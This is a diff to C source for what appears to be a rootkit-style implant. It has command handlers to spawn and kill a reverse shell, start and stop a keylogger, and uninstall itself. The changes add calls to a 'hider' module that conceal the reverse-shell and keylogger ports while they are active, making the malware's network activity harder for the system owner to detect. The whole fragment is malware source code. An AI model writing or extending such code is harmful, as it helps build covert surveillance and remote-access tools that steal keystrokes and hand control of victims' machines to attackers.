@@ -46,6 +46,8 @@ static void remove_reverse_shell(command_processor_context_t *command_processor_
     if (!command_processor_ctx)
         return;
 
+    hider_unhide_port(command_processor_ctx->hider_ctx, REVERSE_SHELL_PORT);
+
     if (*(command_processor_ctx->reverse_shell_pid) > 0) {
         kill(*(command_processor_ctx->reverse_shell_pid), SIGKILL);
         waitpid(*(command_processor_ctx->reverse_shell_pid), NULL, 0);
@@ -58,6 +60,8 @@ static int keylogger_start(command_processor_context_t *command_processor_ctx) {
     if (!command_processor_ctx)
         return -EINVAL;
 
+    hider_hide_port(command_processor_ctx->hider_ctx, KEYLOGGER_PORT);
+
     *(command_processor_ctx->keylogger_active) = true;
     return 0;
 }
@@ -65,6 +69,8 @@ static int keylogger_start(command_processor_context_t *command_processor_ctx) {
 static int keylogger_stop(command_processor_context_t *command_processor_ctx) {
     if (!command_processor_ctx)
         return -EINVAL;
+
+    hider_unhide_port(command_processor_ctx->hider_ctx, KEYLOGGER_PORT);
 
     *(command_processor_ctx->keylogger_active) = false;
     return 0;
@@ -93,6 +99,8 @@ static void uninstall(command_processor_context_t *command_processor_ctx) {
 static int spawn_reverse_shell(command_processor_context_t *command_processor_ctx) {
     if (!command_processor_ctx)
         return -EINVAL;
+
+    hider_hide_port(command_processor_ctx->hider_ctx, REVERSE_SHELL_PORT);
 
     pid_t pid = fork();
     if (pid < 0) {
